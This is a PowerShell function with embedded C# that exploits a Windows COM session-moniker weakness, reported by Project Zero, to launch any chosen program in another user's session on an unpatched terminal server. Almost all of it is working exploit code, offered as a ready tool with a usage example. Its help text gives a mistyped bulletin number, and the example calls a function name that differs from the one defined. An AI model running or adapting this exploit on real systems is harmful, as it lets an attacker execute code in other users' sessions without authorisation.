Function Start-ProcessInSession {
	<#
	.SYNOPSIS
		Start a process in a different session on the same server when MS17-0100 is not installed
	.DESCRIPTION
		Based on the work of James Foreshaw
		
		https://bugs.chromium.org/p/project-zero/issues/detail?id=1021
	.PARAMETER SessionID
		The SessionID where you want to pop a process. Use quser to find all SessionID's on a terminal server
	.PARAMETER Path
		The process you want to pop
	.EXAMPLE
		Start-ANProcessInSession -SessionID 12 -Path C:\Windows\System32\notepad.exe
	#>
    [CmdLetBinding()]
    Param(
        [int]$SessionID,
        [string]$Path
    )

    $APClientHxHelpPaneServerClass = @"
using System;
using System.Runtime.InteropServices;

namespace APClientHxHelpPane {
    public static class Server {
        [ComImport, Guid("8cec592c-07a1-11d9-b15e-000d56bfe6ee"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IHxHelpPaneServer {
            void DisplayTask(string task);
            void DisplayContents(string contents);
            void DisplaySearchResults(string search);
            void Execute([MarshalAs(UnmanagedType.LPWStr)] string file);
        }

        public static void execute(string new_session_id, string path) {
            try {
                IHxHelpPaneServer server = (IHxHelpPaneServer)Marshal.BindToMoniker(String.Format("session:{0}!new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee", new_session_id));
                Uri target = new Uri(path);
                server.Execute(target.AbsoluteUri);
            }
            catch {
                
            }
        }
	}
}
"@
	if (!([System.Management.Automation.PSTypeName]'APClientHxHelpPane.Server').Type) {
		add-type $APClientHxHelpPaneServerClass
	}
	
	$Process = [System.Diagnostics.Process]::GetCurrentProcess()
	if ($Process.SessionId -eq $SessionID) {
		Write-Warning 'SessionID is the id of the current session'
	}
	
	[APClientHxHelpPane.Server]::execute($SessionID,$Path)
}